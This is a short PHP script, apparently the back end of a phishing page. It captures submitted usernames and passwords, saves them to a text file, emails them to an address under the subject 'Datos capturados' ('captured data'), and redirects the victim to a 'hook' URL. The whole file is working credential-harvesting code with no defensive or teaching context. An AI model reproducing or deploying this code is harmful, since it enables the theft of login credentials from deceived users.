<?php 

//Crea fichero e introduce la cadena.
$fichero = fopen("registro/usuario_cod.txt","w");
$contenido = "Datos Registro de Usuario".
"\r\nUsuario: " . $_POST["username"] . 
"\r\nContraseña: " . $_POST["password"];
fwrite($fichero,$contenido);
fclose($fichero);

$miurl = $_POST["gancho"];

$micorreo = $_POST["enviocorreo"];

mail($micorreo,"Datos capturados",$contenido);

header('Location: ' . $miurl);

?>